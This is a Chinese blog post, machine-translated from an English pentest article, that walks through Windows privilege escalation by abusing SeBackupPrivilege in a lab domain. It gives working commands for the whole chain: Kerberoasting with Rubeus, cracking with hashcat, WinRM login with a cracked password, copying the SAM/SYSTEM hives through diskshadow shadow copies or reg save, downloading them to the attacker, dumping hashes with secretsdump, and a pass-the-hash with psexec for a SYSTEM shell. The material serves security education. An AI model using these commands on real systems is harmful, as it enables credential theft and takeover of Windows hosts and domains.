
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18741609" title="发布于 2025-02-27 17:53">
    <span role="heading" aria-level="2">Windows 提权-SeBackupPrivilege 特权</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/sebackupprivilege/" target="_blank" rel="noopener nofollow">Sebackupprivilege – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 获得拥有 SeBackupPrivilege 特权的账户</a></li>
<li><a href="#id2" rel="noopener nofollow">2 提取 SAM/SYSTEM 文件副本：diskshadow.exe</a>
<ul>
<li><a href="#id2.1" rel="noopener nofollow">2.1 从 SAM/SYSTEM 文件提取用户 hash，并利用 PTH 攻击提权</a></li>
</ul>
</li>
<li><a href="#id3" rel="noopener nofollow">3 提取 SAM/SYSTEM 文件副本：reg</a></li>
<li><a href="#id4" rel="noopener nofollow">4 提取 SAM/SYSTEM 文件副本：在 RDP 桌面环境下</a></li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在这篇文章中，我们打算用一个已启用 SeBackupPrivilege 的服务账号从 Windows 服务器中提取 SAM/SYSTEM 文件的副本。</p>
<p>我们来看这样一种场景：我们作为普通的域用户在服务器上获得了立足点，由此开始，我们对备份服务账号进行 Kerberoast 操作，并用破解的凭证登录。接着，我们借助服务账号的 SeBackupPrivilege 特权来获取 SAM/SYSTEM 文件的副本。随后，我们把 SAM/SYSTEM 文件传送到攻击者的机器上，并在本地借助工具导出 SAM/SYSTEM 中的用户哈希值。最后，我们在服务器上实施 PTH (哈希传递攻击)，将权限提升到管理员 shell。</p>
<p>SeBackupPrivilege 特权允许用户对系统中的大部分文件进行备份，哪怕文件的访问控制列表（ACL）并未赋予该用户这种访问权限。因此，攻击者可以通过 SeBackupPrivilege 特权备份整个系统盘，从而直接从创建的备份卷中访问任何文件。</p>
<blockquote>
<p>注：作者设计的这个获取 SeBackupPrivilege 特权账户的场景太过繁琐，如果只是想查看利用 SeBackupPrivilege 特权的方法，可以跳过第一节，直接从<a href="#id2" rel="noopener nofollow">第二节</a>开始阅读。</p>
</blockquote>
<h2 id="1获得拥有-sebackupprivilege-特权的账户"><strong><div id="id1">1、获得拥有 SeBackupPrivilege 特权的账户</div></strong></h2>
<p>在这个域控场景中，主要有两台机器且运行的都是 Windows Server 2019，其中一台是备份服务器(172.16.1.10)，另一台是域控 DC(172.16.1.5)。</p>
<p>在某些情况下，我们以普通域用户 efrost 的身份在备份服务器上获得了立足点。由于我们是利用 web 应用程序漏洞获得的立足点，因此我们没有用户的密码。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936288-482778052.png" alt="" loading="lazy"></p>
<p>获得立足点后，我们开始枚举该域，并发现了以下重要信息：</p>
<ul>
<li>（1）该域中有两个服务帐户。</li>
</ul>
<pre><code class="language-cmd">net user /domain
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937281-1095573908.png" alt="" loading="lazy"></p>
<ul>
<li>（2）帐户 backup_svc 位于备份操作员组（Backup Operators）中，这意味着它具有 SeBackupPrivilege 特权。同时该帐户也位于远程管理用户组（Remote Management Users ）中，由用户 nessex 管理。</li>
</ul>
<blockquote>
<p><strong>远程管理用户</strong>（Remote Management Users ）组中的用户可以通过端口 5985 处的 WinRM 服务执行 PS-Remoting（即 PowerShell 远程连接服务，类似于 ssh 服务）；而<strong>远程桌面用户</strong>（Remote Desktop Users）组中的用户可以通过 RDP 远程连接。</p>
</blockquote>
<pre><code class="language-cmd">net user backup_svc /domain
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937560-721007791.png" alt="" loading="lazy"></p>
<ul>
<li>（3）用户 nesex 位于域管理组（Domain Admins）中。</li>
</ul>
<pre><code class="language-cmd">net group "Domain Admins" /domain
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937249-1030558021.png" alt="" loading="lazy"></p>
<ul>
<li>（4）用户 nesex 在该计算机上拥有自己的用户配置文件夹，这表明 nesex  用户以前在这台机器上登录过。</li>
</ul>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937477-819553717.png" alt="" loading="lazy"></p>
<ul>
<li>（5）两个服务账户均被分配了 SPN，这致使它们能够遭受 kerberoast 攻击。</li>
</ul>
<pre><code class="language-cmd">setspn -T juggernaut.local -F -Q */*
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936246-1650790288.png" alt="" loading="lazy"></p>
<p>我们首先使用 Rubeus.exe 发起一次 kerberoast 攻击，试图提升到其中一个服务账户。</p>
<p>将 Rubeus.exe 下载到受害者机器上，然后使用以下命令成功地请求两个服务帐户的服务票据（TGS-REP HASHES）：</p>
<pre><code class="language-cmd">.\Rubeus.exe kerberoast
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937609-250369903.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174939102-1592356381.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937917-2140827314.png" alt="" loading="lazy"></p>
<p>之后，我们将两个哈希值复制到攻击者机器上的 TXT 文件中，接着手动删除所有的换行符（上图中的那一大串实际是一行字串，粘贴到 TXT 中之后便不再是一行字串了，因此我们需要使其变成一行字串），然后就可以使用 hashcat 进行破解了。</p>
<p>借助 hashcat 的帮助菜单，我们得知 TGS-REP 哈希的破解模式为 13100，接着，我们利用它来构建我们用于破解哈希的 hashcat 命令。</p>
<pre><code class="language-bash">hashcat -h | grep -i 'kerberos'
hashcat -m 13100 ./service_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_hashes.txt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937053-27872451.png" alt="" loading="lazy"></p>
<p>只用了一小会时间，我们便成功地破解了其中一个服务帐户的哈希密码。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937621-144931854.png" alt="" loading="lazy"></p>
<p>检查输出文件，我们发现破解了 backup_svc 帐户的哈希。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937618-324257385.png" alt="" loading="lazy"></p>
<p><strong>backup_svc : Makemoney1!</strong></p>
<blockquote>
<p>本场景只是关于 Kerberoasting 攻击的一个快速示例，如果要了解此攻击的更多示例，请查看我有关 Kerberoasting 的<a href="https://juggernaut-sec.com/kerberoasting/" target="_blank" rel="noopener nofollow">文章</a>。</p>
</blockquote>
<p>从之前的枚举中，我们得知该帐户是远程管理用户组的一部分，这意味着我们应该能够在 WinRM 上获得 shell。</p>
<p>为了检测我们是否可以通过 WinRM 获得备份服务器或域控服务器上的 shell，我们将使用一个名为 <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener nofollow">crackmapexec</a> 的强大工具进行测试：</p>
<pre><code class="language-bash">crackmapexec winrm 172.16.1.5 172.16.1.10 -d juggernaut.local -u backup_svc -p 'Makemoney1!'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937037-633695891.png" alt="" loading="lazy"></p>
<p>看到 <strong>Pwn3d！</strong> 这意味着我们对备份服务器具有 WinRM 的访问权限。但是，我们没有域控的 WinRM 访问权限。</p>
<p>有了这一发现，我们就可以使用找到的凭证和一个名为 <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener nofollow">evil-winrm</a> 的强大工具以及以下命令登录备份服务器：</p>
<pre><code class="language-bash">evil-winrm -u backup_svc -p 'Makemoney1!' -i 172.16.1.10
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937151-877753045.png" alt="" loading="lazy"></p>
<p>登录之后，使用 whoami /priv 命令快速检查一下当前账户的权限，我们看到它确实启用了 SeBackupPrivilege 特权。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936693-1268815060.png" alt="" loading="lazy"></p>
<h2 id="2提取-samsystem-文件副本diskshadowexe"><strong><div id="id2">2、提取 SAM/SYSTEM 文件副本：diskshadow.exe</div></strong></h2>
<p>在本例中，我们将使用<strong>卷影副本（Volume Shadow Copy Service, VSS）</strong>管理工具 diskshadow.exe 去创建系统盘（C盘）的卷影副本来提取 SAM/SYSTEM 文件的副本。创建 C 盘的卷影副本后，我们就可以与之交互并访问文件系统中的任何文件。</p>
<blockquote>
<p>通常情况下，diskshadow.exe 仅在 Windows Server 上安装，Windows 客户机上不会有。</p>
</blockquote>
<p>由于 diskshadow.exe 是一个交互式命令，而我们目前的 shell 环境是一个非交互式的会话，因此我们需要制作一个 diskshadow 的脚本文件，让其以批处理的方式运行任务。</p>
<p>我们直接在受害机器上使用以下命令来制作 diskshadow 脚本文件：</p>
<pre><code class="language-cmd">echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
</code></pre>
<p>上述命令实际上是让 diskshadow.exe 给 C 盘创建一个副本，然后为其分配盘符 Z 并使其可用（使其可作为驱动器访问）。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937479-48828421.png" alt="" loading="lazy"></p>
<p>现在，我们可以使用以下命令开始运行：</p>
<pre><code class="language-cmd">diskshadow.exe /s c:\temp\diskshadow.txt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937306-1520354047.png" alt="" loading="lazy"></p>
<p>现在，C 盘的卷影副本已成功创建并显示为 Z 盘，我们可以使用以下 robocopy 命令从 <code>Z:\windows\system32\config</code> 中提取 SAM/SYSTEM 副本：</p>
<pre><code class="language-cmd">robocopy /b Z:\Windows\System32\Config C:\temp SAM
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937275-472522755.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937313-1095561378.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937521-1680852127.png" alt="" loading="lazy"></p>
<blockquote>
<p>如果您能以具有 SeBackupPrivileges 的用户身份访问域控机器，则表示您已破解了整个域（因为整个域用户的哈希我们都能够得到）。在域控机器上，您可以重复上述步骤，但目标不是本地 SAM/SYSTEM 文件，而是 NTDS.dit 文件。因为 SAM 文件只是包含本地用户的哈希值，而 NTDS.dit 文件却包含了所有域用户的哈希值！</p>
</blockquote>
<h4 id="21从-samsystem-文件提取用户-hash并利用-pth-攻击提权"><strong><div id="id2.1">2.1、从 SAM/SYSTEM 文件提取用户 hash，并利用 PTH 攻击提权</div></strong></h4>
<p>由于我们正在使用 evil-winrm 工具，因此可以使用工具内置的上传功能将这些文件下载到我们的攻击者机器上。</p>
<blockquote>
<p>注：evil-winrm 工具内置的命令有：download、upload、services。</p>
</blockquote>
<pre><code class="language-cmd">download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937340-777244642.png" alt="" loading="lazy"></p>
<p>回到攻击者机，我们看到两个文件都已成功下载。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937334-874215299.png" alt="" loading="lazy"></p>
<p>现在，既然已经拥有了 SAM/SYSTEM 副本，那我们就可以使用 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener nofollow">impacket</a> 套件中的 secretsdump.py 这个工具提取哈希了。</p>
<pre><code class="language-bash">secretsdump.py -sam SAM -system SYSTEM LOCAL
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937246-1661604376.png" alt="" loading="lazy"></p>
<p>在提取出来的用户哈希列表中，令我们最感兴趣的便是 Administrator 用户的哈希。接下来，我们依旧会使用 Impacket 工具套件中的 psexec.py 工具，利用本地管理员的哈希来进行 PTH(pass-the-hash) 攻击，从而在备份服务器上获取 SYSTEM shell。复制整个 NTLM 哈希并将其置入以下命令：</p>
<pre><code class="language-bash">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4 administrator@172.16.1.10
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936363-1115232730.png" alt="" loading="lazy"></p>
<blockquote>
<p>如果想更深入地了解 PTH(pass-the-hash) 攻击，请在<a href="https://juggernaut-sec.com/pass-the-hash-attacks/" target="_blank" rel="noopener nofollow">此处</a>查看有关该主题的文章。</p>
</blockquote>
<h2 id="3提取-samsystem-文件副本reg"><strong><div id="id3">3、提取 SAM/SYSTEM 文件副本：reg</div></strong></h2>
<p>在本例中，我们使用 reg 命令从注册表中提取 SAM/SYSTEM 文件副本，而在这篇<a href="https://juggernaut-sec.com/dumping-local-sam-file-hashes/" target="_blank" rel="noopener nofollow">文章</a>中也看到了这种提取 SAM/SYSTEM 文件的技术。</p>
<blockquote>
<p>默认情况下，SeBackupPrivileges 特权的用户是被允许导出注册表的配置单元数据(hiv)。</p>
</blockquote>
<blockquote>
<p>注：注册表虽然是 Windows 系统的一个数据库，但是它的数据信息其实也是存储在文件中的，而不同的根键所对应的配置单元文件的系统路径也是不同的，例如：HKLM 对应着 <code>C:\Windows\System32\config\</code> 目录、HKCU 对应着 <code>C:\Users\&lt;用户名&gt;\NTUSER.DAT</code> 文件。</p>
<p>而 reg save 执行的过程便是导出这个配置单元文件的过程，它的数据和直接从文件系统获取单文件性质是一样的。</p>
</blockquote>
<p>使用以下命令，我们可以从注册表中提取 SAM\SYSTEM 文件的副本：</p>
<pre><code class="language-cmd">reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936543-2077848199.png" alt="" loading="lazy"></p>
<h2 id="4提取-samsystem-文件副本在-rdp-桌面环境下"><strong><div id="id4">4、提取 SAM/SYSTEM 文件副本：在 RDP 桌面环境下</div></strong></h2>
<p>在本例中，我们在 Windows 10 桌面环境下演示提取 SAM\SYSTEM 副本的过程。之所以要如此，是因为我们发现在桌面环境下提取 SAM\SYSTEM 副本和在 WinRM 环境下提取副本还是有一些不同的，不同点在于：它要求我们需要具有 <strong>Sebackupprivilege 特权的用户的密码</strong>。</p>
<p>从示例场景出发，<strong>假设</strong>我们是在 Windows 10 主机上获得了一个 <strong>efrost</strong> 的普通域用户身份的立足点，而不是在备份服务器上。<strong>再假设</strong>当我们进行域枚举时，发现 backup_svc 用户也是远程桌面用户（Remote Desktop Users）组的一员。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936445-730884824.png" alt="" loading="lazy"></p>
<p>接着以这个示例场景来说，我们对 backup_svc 账户进行 kerberoast 攻击并破解其密码。但这次，我们不再通过 evil-winrm 来获取 shell，而是像这样使用 xfreerdp：</p>
<pre><code class="language-bash">sudo xfreerdp /u:backup_svc /p:'Makemoney1!' /d:juggernaut.local /v:172.16.1.100 +clipboard
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936841-616747067.png" alt="" loading="lazy"></p>
<p>我们知道 backup_svc 账户在备份操作员组中，但是，当我们使用 whoami /priv 时，我们却并没有看到 SeBackupPrivilege 特权。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937153-2105155416.png" alt="" loading="lazy"></p>
<p>这是因为：<strong>在低完整性的 shell 环境中，SeBackupPrivilege 这项特权默认是未开启的。而若要开启该特权，您需要通过“以管理员身份运行”来打开 cmd，这时会弹出一个 UAC 提示框，要求输入当前用户的密码，而这就是 Windows 对备份操作员组中的用户权限的处理方式。</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937672-1103306187.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174936882-934298599.png" alt="" loading="lazy"></p>
<p>输入密码之后，特权便被开启了。</p>
<blockquote>
<p>注：特权的状态虽然是 Disabled，但是并不影响特权功能的使用，这个 Disabled 可忽略。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174935654-773803710.png" alt="" loading="lazy"></p>
<p>现在我们有了 SeBackupPrivilege 特权，便可以像之前一样从注册表提取 SAM/SYSTEM 文件副本了。</p>
<pre><code class="language-cmd">reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202502/1503193-20250227174937121-87437498.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.3557681044224537" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-27 17:53">2025-02-27 17:53</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18741609" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18741609);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18741609', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18741609', title: 'Windows 提权-SeBackupPrivilege 特权' })">举报</a>
</div>
        